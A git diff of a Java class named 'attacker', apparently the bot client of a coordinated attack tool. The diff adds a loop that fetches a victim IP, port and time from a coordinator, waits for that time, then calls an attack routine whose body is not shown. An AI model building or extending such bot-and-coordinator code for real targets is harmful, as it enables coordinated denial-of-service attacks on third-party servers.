@@ -12,11 +12,9 @@ public class attacker {
 
   private static int state = 0;
 
-
   private static String victim_time = "";
   private static String victim_ip = "";
   private static String victim_port = "";
-
 
   public static String coordinator_ip_string = "127.0.0.1";
   private static int coordinator_port = 2337;
@@ -39,7 +37,6 @@ public class attacker {
       now.setTime(sf.parse(time));
       now.set(current_year, current_month, current_day);
       now.add(0, 10);
-      System.out.println(Calendar.ZONE_OFFSET / (60 * 1000));
       //System.out.println((now.get(Calendar.ZONE_OFFSET) + now.get(Calendar.DST_OFFSET)) / (60 * 1000));
     } catch (Exception e) {}
     return now;
@@ -67,8 +64,17 @@ public class attacker {
   /*
     Wait until the attack time is here.
   */
-  private static void waitForAttack() {
-
+  private static void waitForAttackTime() {
+    int waiting_time = 1 * 1000;
+    while (true) {
+      //will return negative one, if desired time , has passed.
+      int i = convertStringToTime(victim_time).compareTo(Calendar.getInstance());
+      if (i == -1) {
+        return;
+      }
+      System.out.println("Waiting for the right time to attack.");
+      try { Thread.sleep(waiting_time); } catch (Exception e) {}
+    }
   }
 
   /*
@@ -103,7 +109,7 @@ public class attacker {
           break;
         }
       }
-      System.out.println("Here it is: " + victim_ip + ", " + victim_port + ", " + victim_time);
+      System.out.println("Target acquired: " + victim_ip + ", " + victim_port + ", " + victim_time);
     } catch (IOException e) {}
   }
 
@@ -142,7 +148,8 @@ public class attacker {
   } //end convertStringToByteArrayIP()
 
   private static void startAttack() {
-    waitForAttack();
+    waitForAttackTime();
+    System.out.println("opening connection to victim server.");
     attackServer();
   }
 
@@ -153,29 +160,17 @@ public class attacker {
     } catch (Exception e) {}
   }
 
-
   public static void main(String[] args) throws IOException {
     //two modes, monitoring mode, and attacking mode.
     //monitoring mode
       //get the information from the coordinator
       //parse information, including converting the IP to a byte array.
     //attack mode.
-    /*
+
     while (true) {
-      if (STATE == MONITORING) {
-
-      } else if (STATE == ATTACKING) {
-        ExecutorService executor = Executors.newSingleThreadExecutor();
-        executor.invokeAll(Arrays.asList(new MyTask()));
-        executor.shutdown();
-      }
+      startMonitor();
+      startAttack();
+      try { Thread.sleep(60000); } catch (Exception e) {} //time to wait before trying to get new attack
     }
-    */
-
-
-    //attackServer("127.0.0.1", 1337);
-    startMonitor();
-
-    System.out.println(convertStringToTime("07:07:07").getTime());
   }
 }
